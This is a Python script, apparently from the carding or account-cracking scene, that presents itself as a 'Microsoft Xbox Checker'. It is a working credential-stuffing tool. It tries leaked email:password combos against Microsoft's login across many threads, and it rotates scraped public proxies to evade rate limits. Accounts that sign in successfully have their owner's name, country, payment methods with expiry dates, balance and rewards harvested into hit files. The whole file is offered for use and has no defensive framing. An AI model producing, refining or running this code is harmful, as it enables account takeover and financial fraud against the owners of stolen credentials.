#!/usr/bin/env python3
"""
Microsoft Xbox Checker v2.1 - Con soporte de Proxies
Incluye capturas: Nombre, País, Métodos de Pago, Balance, Rewards
Soporte para proxies de free-proxy-list.net y archivos locales
"""
import sys
import os
import requests
import time
import random
import json
import re
from urllib.parse import quote
from tenacity import retry, stop_after_attempt, wait_exponential
import colorama
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from datetime import datetime

# Directorio base del script
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
os.chdir(SCRIPT_DIR)  # Cambiar al directorio del script

colorama.init(autoreset=True)
lock = threading.Lock()
thread_local = threading.local()

# Contadores globales
stats = {"hits": 0, "2fa": 0, "fails": 0, "errors": 0, "locked": 0, "checked": 0}

# Lista global de proxies
proxy_list = []
proxy_index = 0
use_proxies = False

def fetch_proxies_from_web():
    """Obtiene proxies de free-proxy-list.net"""
    proxies = []
    try:
        print(f"{colorama.Fore.LIGHTYELLOW_EX}[*] Obteniendo proxies de free-proxy-list.net...{colorama.Fore.RESET}")
        r = requests.get(
            'https://free-proxy-list.net/',
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'},
            timeout=15
        )
        # Múltiples patrones para extraer proxies
        # Patrón 1: tabla con HTTPS column
        pattern1 = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})</td><td>(\d+)</td><td>[^<]*</td><td>[^<]*</td><td>[^<]*</td><td>[^<]*</td><td>(yes|no)'
        matches = re.findall(pattern1, r.text, re.IGNORECASE)
        if matches:
            for ip, port, https in matches:
                proto = 'https' if https.lower() == 'yes' else 'http'
                proxies.append(f"{proto}://{ip}:{port}")
        else:
            # Patrón 2: cualquier IP:puerto en la página
            pattern2 = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})</td>\s*<td>(\d+)'
            matches = re.findall(pattern2, r.text)
            for ip, port in matches:
                proxies.append(f"http://{ip}:{port}")
        
        print(f"{colorama.Fore.LIGHTGREEN_EX}[+] Obtenidos {len(proxies)} proxies de la web{colorama.Fore.RESET}")
    except Exception as e:
        print(f"{colorama.Fore.RED}[!] Error obteniendo proxies: {e}{colorama.Fore.RESET}")
    return proxies

def fetch_proxies_from_sslproxies():
    """Obtiene proxies SSL de sslproxies.org"""
    proxies = []
    try:
        print(f"{colorama.Fore.LIGHTYELLOW_EX}[*] Obteniendo proxies de sslproxies.org...{colorama.Fore.RESET}")
        r = requests.get(
            'https://www.sslproxies.org/',
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'},
            timeout=15
        )
        pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})</td><td>(\d+)'
        matches = re.findall(pattern, r.text)
        for ip, port in matches:
            proxies.append(f"http://{ip}:{port}")
        print(f"{colorama.Fore.LIGHTGREEN_EX}[+] Obtenidos {len(proxies)} proxies SSL{colorama.Fore.RESET}")
    except Exception as e:
        print(f"{colorama.Fore.RED}[!] Error: {e}{colorama.Fore.RESET}")
    return proxies

def fetch_proxies_from_api():
    """Obtiene proxies de ProxyScrape API (más confiable)"""
    proxies = []
    try:
        print(f"{colorama.Fore.LIGHTYELLOW_EX}[*] Obteniendo proxies de ProxyScrape API...{colorama.Fore.RESET}")
        r = requests.get(
            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all',
            headers={'User-Agent': 'Mozilla/5.0'},
            timeout=15
        )
        for line in r.text.split('\n'):
            line = line.strip()
            if line and ':' in line:
                proxies.append(f"http://{line}")
        print(f"{colorama.Fore.LIGHTGREEN_EX}[+] Obtenidos {len(proxies)} proxies de API{colorama.Fore.RESET}")
    except Exception as e:
        print(f"{colorama.Fore.RED}[!] Error: {e}{colorama.Fore.RESET}")
    return proxies

def load_proxies_from_file(filepath: str):
    """Carga proxies desde archivo local (formato: ip:port o proto://ip:port)"""
    proxies = []
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                if '://' not in line:
                    line = f"http://{line}"
                proxies.append(line)
        print(f"{colorama.Fore.LIGHTGREEN_EX}[+] Cargados {len(proxies)} proxies de {filepath}{colorama.Fore.RESET}")
    except Exception as e:
        print(f"{colorama.Fore.RED}[!] Error cargando proxies: {e}{colorama.Fore.RESET}")
    return proxies

def get_next_proxy():
    """Obtiene el siguiente proxy de la lista (rotación)"""
    global proxy_index
    if not proxy_list:
        return None
    with lock:
        proxy = proxy_list[proxy_index % len(proxy_list)]
        proxy_index += 1
    return proxy

def get_session(proxy=None):
    """Sesión persistente por hilo con headers base y proxy opcional."""
    if not hasattr(thread_local, "session"):
        s = requests.Session()
        s.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        })
        thread_local.session = s
    
    session = thread_local.session
    
    if proxy and use_proxies:
        session.proxies = {
            'http': proxy,
            'https': proxy
        }
    else:
        session.proxies = {}
    
    return session

def extract_ppft(html: str) -> str:
    """Extrae PPFT con múltiples patrones incluyendo JSON escapado."""
    patterns = [
        r'value=\\"([^"\\]+)\\"[^>]*name=\\"PPFT\\"',
        r'name=\\"PPFT\\"[^>]*value=\\"([^"\\]+)\\"',
        r'name="PPFT"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="PPFT"',
        r"sFT:'([^']+)'",
        r'sFT:"([^"]+)"',
        r'"sFT":"([^"]+)"',
    ]
    for pattern in patterns:
        match = re.search(pattern, html)
        if match:
            return match.group(1)
    return ""

def extract_url_post(html: str) -> str:
    """Extrae URL de POST con múltiples patrones."""
    patterns = [
        r'"urlPost":"([^"]+)"',
        r"urlPost:'([^']+)'",
        r'urlPost:"([^"]+)"',
        r'"urlPostMsa":"([^"]+)"',
        r"urlPostMsa:'([^']+)'",
        r'urlPostMsa:"([^"]+)"',
    ]
    for pattern in patterns:
        match = re.search(pattern, html)
        if match:
            url = match.group(1).replace('\\/', '/').replace('\\u0026', '&')
            return url
    return ""

def parse_css_value(html: str, selector: str, attr: str) -> str:
    """Extrae valor de atributo por selector CSS simple."""
    pattern = rf'{selector.replace("[", r"[").replace("]", r"]")}[^>]*{attr}="([^"]*)"'
    match = re.search(pattern, html, re.IGNORECASE)
    return match.group(1) if match else ""

@retry(stop=stop_after_attempt(2), wait=wait_exponential(multiplier=1, min=1, max=5), reraise=True)
def check(combo: str) -> dict:
    """Verifica credencial Microsoft con capturas completas."""
    try:
        user, password = combo.strip().split(':', 1)
    except ValueError:
        return {"status": "invalid", "combo": combo, "msg": "Formato inválido"}

    proxy = get_next_proxy() if use_proxies else None
    session = get_session(proxy)
    session.cookies.clear()
    
    result = {
        "status": "unknown",
        "combo": combo,
        "user": user,
        "proxy": proxy,
        "captures": {}
    }

    # === PASO 1: Obtener página de login ===
    try:
        r1 = session.get(
            'https://login.live.com/login.srf',
            params={'wa': 'wsignin1.0', 'wp': 'MBI_SSL', 'wreply': 'https://account.microsoft.com/'},
            headers={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Upgrade-Insecure-Requests': '1',
            },
            timeout=20,
            allow_redirects=True
        )
        r1.raise_for_status()
    except Exception as e:
        raise Exception(f"GET inicial falló: {e}")

    html = r1.text
    url_referer = r1.url

    # Extraer PPFT
    PPFT = extract_ppft(html)
    if not PPFT:
        raise Exception("No se encontró PPFT")

    # Extraer URL POST
    urlPost = extract_url_post(html)
    if not urlPost:
        raise Exception("No se encontró urlPost")

    # === PASO 2: Enviar credenciales ===
    post_data = {
        'i13': '0',
        'login': user,
        'loginfmt': user,
        'type': '11',
        'LoginOptions': '3',
        'lrt': '',
        'lrtPartition': '',
        'hisRegion': '',
        'hisScaleUnit': '',
        'passwd': password,
        'ps': '2',
        'psRNGCDefaultType': '',
        'psRNGCEntropy': '',
        'psRNGCSLK': '',
        'canary': '',
        'ctx': '',
        'hpgrequestid': '',
        'PPFT': PPFT,
        'PPSX': 'Passport',
        'NewUser': '1',
        'FoundMSAs': '',
        'fspost': '0',
        'i21': '0',
        'CookieDisclosure': '0',
        'IsFidoSupported': '1',
        'isSignupPost': '0',
        'isRecoveryAttemptPost': '0',
        'i19': '9495'
    }

    try:
        r2 = session.post(
            urlPost,
            data=post_data,
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://login.live.com',
                'Referer': url_referer,
                'Upgrade-Insecure-Requests': '1',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            },
            timeout=20,
            allow_redirects=True
        )
    except Exception as e:
        raise Exception(f"POST login falló: {e}")

    response_text = r2.text
    all_cookies = str(session.cookies.get_dict())

    # === Verificar resultado ===
    
    # Rate limit
    if "Too Many Requests" in response_text or r2.status_code == 429:
        raise Exception("Rate Limited")

    # 2FA
    if any(x in response_text for x in [
        'action="https://account.live.com/identity/confirm?',
        'action="https://account.live.com/recover?',
        'action="https://account.live.com/RecoverAccount',
        'Approve sign in request',
        'Help us protect your account',
        'id="iProofEmail"',
        'id="iSelectProofAction"',
        'Enter the code'
    ]):
        result["status"] = "2fa"
        result["msg"] = "2FA detectado"
        return result

    # Cuenta bloqueada
    if any(x in response_text for x in [
        'action="https://account.live.com/ar/cancel?',
        'action="https://account.live.com/Abuse?',
        'tried to sign in too many times'
    ]):
        result["status"] = "locked"
        result["msg"] = "Cuenta bloqueada"
        return result

    # Credenciales incorrectas
    if any(x in response_text for x in [
        'Your account or password is incorrect',
        'Votre compte ou mot de passe est incorrect',
        "That Microsoft account doesn't exist",
        "sErrTxt"
    ]):
        result["status"] = "fail"
        result["msg"] = "Credenciales incorrectas"
        return result

    # Login exitoso
    if "__Host-MSAAUTH" in all_cookies or "Stay signed in?" in response_text or "Keep me signed in" in response_text:
        result["status"] = "hit"
        result["msg"] = "Login exitoso"
        
        # === Capturas adicionales ===
        try:
            # Obtener página de cuenta
            r3 = session.get(
                'https://account.microsoft.com/?ref=MeControl',
                headers={'Referer': 'https://login.live.com/'},
                timeout=15,
                allow_redirects=True
            )
            
            req_token = parse_css_value(r3.text, '[name="__RequestVerificationToken"]', 'value')
            
            api_headers = {
                'Accept': 'application/json, text/plain, */*',
                'X-Requested-With': 'XMLHttpRequest',
                '__RequestVerificationToken': req_token,
                'Referer': 'https://account.microsoft.com/',
            }

            # Captura: Perfil
            try:
                r_profile = session.get(
                    'https://account.microsoft.com/home/api/profile/personal-info',
                    headers=api_headers,
                    timeout=10
                )
                if r_profile.status_code == 200:
                    data = r_profile.json()
                    result["captures"]["fullName"] = data.get("fullName", "N/A")
                    result["captures"]["country"] = data.get("countryCode", "N/A")
            except:
                pass

            # Captura: Pagos
            try:
                r_pay = session.get(
                    'https://account.microsoft.com/home/api/payment-instruments/pi-summary',
                    headers=api_headers,
                    timeout=10
                )
                if r_pay.status_code == 200:
                    pay_data = r_pay.json()
                    instruments = pay_data.get("paymentInstruments", [])
                    if instruments:
                        methods = []
                        for pi in instruments:
                            name = pi.get("name", "?")
                            exp = pi.get("expirationDate", "?")
                            methods.append(f"{name}(Exp:{exp})")
                        result["captures"]["payment"] = " | ".join(methods)
                        result["captures"]["balance"] = pay_data.get("balance", "N/A")
                    else:
                        result["captures"]["payment"] = "NO PAYMENT"
            except:
                result["captures"]["payment"] = "Error"

            # Captura: Rewards
            try:
                r_rewards = session.get(
                    'https://account.microsoft.com/home/api/rewards/rewards-summary',
                    headers=api_headers,
                    timeout=10
                )
                if r_rewards.status_code == 200:
                    result["captures"]["rewards"] = r_rewards.json().get("balance", "N/A")
            except:
                pass

        except Exception as e:
            result["captures"]["error"] = str(e)[:50]

        return result

    # Verificar indicios adicionales de cuenta bloqueada o locked
    if any(x in response_text.lower() for x in [
        'verify your identity',
        'confirma tu identidad',
        'unusual activity',
        'actividad inusual',
        'something went wrong',
        'account has been locked',
        'cuenta bloqueada',
        'suspicious'
    ]):
        result["status"] = "locked"
        result["msg"] = "Locked (indicios detectados)"
        return result
    
    # Si hay cookies de sesión pero no detectó hit, tratar como locked
    if "MSPOK" in all_cookies or "OID" in all_cookies:
        result["status"] = "locked"
        result["msg"] = "Locked (sesión parcial)"
        return result

    result["status"] = "unknown"
    result["msg"] = "Respuesta no reconocida"
    return result


def format_result(idx: int, result: dict) -> str:
    """Formatea resultado para consola."""
    combo = result.get("combo", "?")
    status = result.get("status", "unknown")
    captures = result.get("captures", {})
    proxy = result.get("proxy", "")
    
    idx_str = f"[{str(idx).zfill(4)}]"
    proxy_str = f" [P:{proxy.split('/')[-1][:15]}]" if proxy else ""
    
    if status == "hit":
        cap_parts = []
        if captures.get("fullName"):
            cap_parts.append(f"Name:{captures['fullName']}")
        if captures.get("country"):
            cap_parts.append(f"Country:{captures['country']}")
        if captures.get("payment"):
            cap_parts.append(f"Pay:{captures['payment']}")
        if captures.get("rewards"):
            cap_parts.append(f"Rewards:{captures['rewards']}")
        cap_str = " | ".join(cap_parts) if cap_parts else ""
        return f"{colorama.Fore.LIGHTGREEN_EX}{idx_str} ✅ HIT: {combo}{proxy_str} | {cap_str}"
    
    elif status == "2fa":
        return f"{colorama.Fore.LIGHTYELLOW_EX}{idx_str} ⚠️ 2FA: {combo}{proxy_str}"
    
    elif status == "locked":
        return f"{colorama.Fore.LIGHTMAGENTA_EX}{idx_str} 🔒 LOCKED: {combo}{proxy_str}"
    
    elif status == "fail":
        return f"{colorama.Fore.LIGHTRED_EX}{idx_str} ❌ FAIL: {combo}"
    
    else:
        return f"{colorama.Fore.LIGHTCYAN_EX}{idx_str} ❓ UNKNOWN: {combo}"


def save_result(result: dict):
    """Guarda resultado en archivo."""
    combo = result.get("combo", "")
    status = result.get("status", "")
    captures = result.get("captures", {})
    
    with lock:
        stats["checked"] += 1
        
        if status == "hit":
            stats["hits"] += 1
            cap_str = json.dumps(captures, ensure_ascii=False) if captures else ""
            with open(os.path.join(SCRIPT_DIR, 'Hits.txt'), 'a', encoding='utf-8') as f:
                f.write(f"{combo} | {cap_str}\n")
            
            if captures.get("payment") and captures["payment"] != "NO PAYMENT":
                with open(os.path.join(SCRIPT_DIR, 'Hits_WithPayment.txt'), 'a', encoding='utf-8') as f:
                    f.write(f"{combo} | {captures['payment']}\n")
                    
        elif status == "2fa":
            stats["2fa"] += 1
            with open(os.path.join(SCRIPT_DIR, '2FA.txt'), 'a', encoding='utf-8') as f:
                f.write(f"{combo}\n")
                
        elif status == "locked":
            stats["locked"] += 1
            with open(os.path.join(SCRIPT_DIR, 'Locked.txt'), 'a', encoding='utf-8') as f:
                f.write(f"{combo}\n")
                
        elif status == "fail":
            stats["fails"] += 1
            
        else:
            stats["errors"] += 1


def print_banner():
    print(f"""
{colorama.Fore.LIGHTCYAN_EX}╔═══════════════════════════════════════════════════════╗
║   Microsoft Xbox Checker v2.1 - Full Capture + Proxy  ║
║   Capturas: Perfil, Pagos, Rewards                    ║
╚═══════════════════════════════════════════════════════╝{colorama.Fore.RESET}
    """)


def print_stats():
    """Estadísticas finales."""
    print(f"\n{colorama.Fore.LIGHTCYAN_EX}{'='*55}")
    print(f"{colorama.Fore.LIGHTGREEN_EX}✅ Hits: {stats['hits']}")
    print(f"{colorama.Fore.LIGHTYELLOW_EX}⚠️  2FA: {stats['2fa']}")
    print(f"{colorama.Fore.LIGHTMAGENTA_EX}🔒 Locked: {stats['locked']}")
    print(f"{colorama.Fore.LIGHTRED_EX}❌ Fails: {stats['fails']}")
    print(f"{colorama.Fore.LIGHTWHITE_EX}❓ Errors: {stats['errors']}")
    print(f"{colorama.Fore.LIGHTCYAN_EX}📊 Total: {stats['checked']}")
    print(f"{'='*55}\n{colorama.Fore.RESET}")


def setup_proxies():
    """Configuración de proxies."""
    global proxy_list, use_proxies
    
    print(f"\n{colorama.Fore.LIGHTYELLOW_EX}=== Configuración de Proxies ==={colorama.Fore.RESET}")
    print("1) Sin proxies (directo)")
    print("2) Cargar desde archivo local (proxies.txt)")
    print("3) Obtener de free-proxy-list.net (~300)")
    print("4) Obtener de sslproxies.org (~100)")
    print("5) Obtener de ProxyScrape API (~900+) [RECOMENDADO]")
    print("6) Combinar todas las fuentes")
    
    choice = input(f"\n{colorama.Fore.LIGHTYELLOW_EX}Selecciona (1-6) [default: 1]: {colorama.Fore.RESET}").strip() or "1"
    
    if choice == "1":
        use_proxies = False
        print(f"{colorama.Fore.LIGHTGREEN_EX}[+] Modo directo (sin proxies){colorama.Fore.RESET}")
        return
    
    use_proxies = True
    
    if choice == "2":
        filepath = input(f"{colorama.Fore.LIGHTYELLOW_EX}Ruta del archivo [proxies.txt]: {colorama.Fore.RESET}").strip() or "proxies.txt"
        proxy_list = load_proxies_from_file(os.path.join(SCRIPT_DIR, filepath))
    
    elif choice == "3":
        proxy_list = fetch_proxies_from_web()
    
    elif choice == "4":
        proxy_list = fetch_proxies_from_sslproxies()
    
    elif choice == "5":
        proxy_list = fetch_proxies_from_api()
    
    elif choice == "6":
        proxy_list = fetch_proxies_from_api()
        proxy_list.extend(fetch_proxies_from_web())
        proxy_list.extend(fetch_proxies_from_sslproxies())
        filepath = input(f"{colorama.Fore.LIGHTYELLOW_EX}Archivo adicional (Enter para omitir): {colorama.Fore.RESET}").strip()
        if filepath:
            proxy_list.extend(load_proxies_from_file(os.path.join(SCRIPT_DIR, filepath)))
    
    if not proxy_list:
        print(f"{colorama.Fore.RED}[!] No se encontraron proxies, usando modo directo{colorama.Fore.RESET}")
        use_proxies = False
    else:
        # Eliminar duplicados
        proxy_list = list(set(proxy_list))
        random.shuffle(proxy_list)
        print(f"{colorama.Fore.LIGHTGREEN_EX}[+] Total proxies disponibles: {len(proxy_list)}{colorama.Fore.RESET}")


def main():
    print_banner()
    
    # Configurar proxies
    setup_proxies()
    
    # Cargar combos
    combo_file = input(f"\n{colorama.Fore.LIGHTYELLOW_EX}Archivo de combos [combo.txt]: {colorama.Fore.RESET}").strip() or 'combo.txt'
    
    try:
        with open(combo_file, encoding='utf-8') as f:
            combos = [line.strip() for line in f if ':' in line.strip()]
    except Exception as e:
        print(f"{colorama.Fore.RED}Error: {e}{colorama.Fore.RESET}")
        sys.exit(1)

    if not combos:
        print(f"{colorama.Fore.RED}No hay combos válidos.{colorama.Fore.RESET}")
        sys.exit(1)

    print(f"{colorama.Fore.LIGHTGREEN_EX}[+] Cargados: {len(combos)} combos{colorama.Fore.RESET}")
    
    # Default 150 threads cuando hay proxies, 20 sin proxies
    default_threads = 150 if use_proxies else 20
    try:
        max_threads = int(input(f"{colorama.Fore.LIGHTYELLOW_EX}Threads [{default_threads}]: {colorama.Fore.RESET}").strip() or str(default_threads))
    except:
        max_threads = default_threads

    print(f"\n{colorama.Fore.LIGHTCYAN_EX}[*] Iniciando con {max_threads} threads...{colorama.Fore.RESET}\n")
    
    processed = set()
    start_time = time.time()

    try:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = {executor.submit(check, combo): combo for combo in combos}
            
            for idx, future in enumerate(as_completed(futures), start=1):
                combo = futures[future]
                try:
                    result = future.result(timeout=60)
                    print(format_result(idx, result))
                    save_result(result)
                    processed.add(combo)
                except Exception as ex:
                    error_msg = str(ex)
                    print(f"{colorama.Fore.RED}[{str(idx).zfill(4)}] Error: {combo[:30]}... - {error_msg[:40]}{colorama.Fore.RESET}")
                    if "Rate Limited" not in error_msg and "Too Many" not in error_msg:
                        processed.add(combo)
                        stats["errors"] += 1
                        stats["checked"] += 1
    except KeyboardInterrupt:
        print(f"\n{colorama.Fore.LIGHTYELLOW_EX}[!] Deteniendo...{colorama.Fore.RESET}")

    # Guardar restantes
    remaining = [c for c in combos if c not in processed]
    with open(combo_file, 'w', encoding='utf-8') as f:
        f.write("\n".join(remaining) + "\n" if remaining else "")

    elapsed = time.time() - start_time
    print_stats()
    print(f"{colorama.Fore.LIGHTGREEN_EX}✅ Completado en {elapsed:.1f}s ({stats['checked']/elapsed:.1f} cpm)")
    print(f"{colorama.Fore.LIGHTYELLOW_EX}📁 Restantes: {len(remaining)}{colorama.Fore.RESET}")


if __name__ == '__main__':
    import signal
    import sys
    
    # Bandera para shutdown graceful
    shutdown_flag = threading.Event()
    
    def signal_handler(sig, frame):
        print(f"\n{colorama.Fore.LIGHTYELLOW_EX}[!] Cerrando threads...{colorama.Fore.RESET}")
        shutdown_flag.set()
    
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        main()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"{colorama.Fore.RED}Error fatal: {e}{colorama.Fore.RESET}")
    finally:
        print(f"\n{colorama.Fore.LIGHTYELLOW_EX}[!] Interrumpido{colorama.Fore.RESET}")
        print_stats()
        # Dar tiempo a threads para cerrar
        import time
        time.sleep(0.5)
